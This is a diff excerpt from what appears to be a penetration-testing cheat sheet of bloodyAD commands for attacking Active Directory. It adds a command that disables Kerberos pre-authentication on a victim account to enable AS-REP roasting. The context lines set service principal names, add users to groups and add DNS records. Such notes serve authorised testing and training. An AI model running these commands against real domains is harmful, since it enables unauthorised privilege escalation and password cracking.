@@ -4591,6 +4591,7 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USE
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
 faketime 'now + 8 hours' bloodyAD -d <RHOST> --host <FQDN> --dc-ip <IP> -u svc_ldap -p <PASSWORD> -k  set object 'victin_name' servicePrincipalName	// Set a Service Principal Name (SPN) using Kerberos
 KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
+KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD -d <RHOST> -k --dc-ip <IP> --host <FQDN> add uac -f DONT_REQ_PREAUTH <VICTIM>		// Enables AS-REP roasting by disabling Kerberos pre-authentication (due to GenericWrite privileges via RESTORE_USERS group)
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
